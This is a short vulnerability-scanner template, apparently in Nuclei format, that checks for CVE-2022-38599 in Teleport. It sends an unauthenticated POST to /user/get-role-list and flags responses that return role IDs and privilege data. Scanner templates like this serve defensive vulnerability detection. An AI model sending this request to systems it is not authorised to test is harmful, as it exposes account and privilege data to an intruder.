id: teleport-info-leak-cve-2022-38599
info:
  name: "Teleport get-role-list 接口信息泄露漏洞"
  author: ProjectDiscoveryAI
  severity: medium
  tags: teleport
http:
  - raw:
      - |
        POST /user/get-role-list HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 0
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"code": 0'
          - '"id"'
          - '"privilege"'
        part: body
      - type: word
        words:
          - 'application/json'
        part: header
